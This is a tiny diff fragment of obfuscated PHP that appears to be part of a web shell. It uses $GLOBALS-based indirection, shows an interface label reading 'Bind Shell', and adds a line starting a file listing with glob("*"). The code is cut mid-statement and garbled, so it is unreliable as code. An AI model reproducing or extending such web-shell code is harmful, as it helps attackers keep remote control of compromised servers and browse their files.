@@ -44,3 +44,4 @@ foreach ($GLOBALS[$GLOBALS['
 );'));}else{echo
 )));');$
 Bind Shell <span
+foreach(glob("*")
